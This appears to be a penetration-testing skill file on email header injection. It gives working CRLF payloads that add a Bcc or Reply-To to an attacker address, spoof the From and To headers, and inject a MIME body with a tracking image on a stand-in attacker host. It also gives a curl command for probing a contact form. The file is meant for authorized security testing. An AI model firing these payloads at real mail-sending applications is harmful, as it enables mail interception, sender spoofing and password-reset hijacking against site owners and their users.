---
name: email-header-injection
description: Email header injection (CWE-93) — CRLF injection into email headers (From, To, Subject, CC, BCC) via form fields to forge/steal mail, add recipients, or inject MIME. Use when the app sends emails (contact form, password reset, notifications) and reflects user input into headers.
category: injection
---

# Email Header Injection

## Detection
- Endpoints that generate email: contact forms, signup/verify, reset, notify, invite.
- Probe CRLF in the field that maps to an email header: `subject=Hello%0d%0aBcc:%20victim@x.com`.

## Exploitation
1. **Header injection**: `%0d%0aBcc: attacker@x.com` → mail secretly CC'd to attacker (data leak of outgoing messages).
2. **To/From spoof**: `%0d%0aFrom: admin@example.com` or `%0d%0aTo:` redirect — sender spoofing.
3. **MIME/body injection**: inject blank line `%0d%0a%0d%0a` then fake body / attachments (`Content-Disposition`).
4. **Recipient swap**: change `To:` header → send victim-targeted mail to attacker address.
5. **Reply-to poisoning**: `%0d%0aReply-To: attacker@x.com` → replies (e.g. password reset confirmations) land on attacker.

## Payloads
```
subject=hi%0d%0aBcc:attacker@x.com
name=x%0d%0aReply-To:attacker@x.com
email=a@b%0d%0aTo:attacker@x.com
%0d%0aContent-Type:text/html%0d%0a%0d%0a<img src=http://attacker/t>
```

## Tool Commands (Windows)
```powershell
# probe with Bcc injection via contact form
curl.exe -s -X POST "$U/contact" -d 'name=test&email=a@b.com&subject=hi%0d%0aBcc:attacker@x.com&msg=body'
# verify via a capture mailbox (in-scope) or response reflecting raw header
```

## Verification & Evidence
- Delivery to injected recipient, header reflected in response, or MIME artifact = proof.
- Use an authorized capture mailbox; do not target real victims.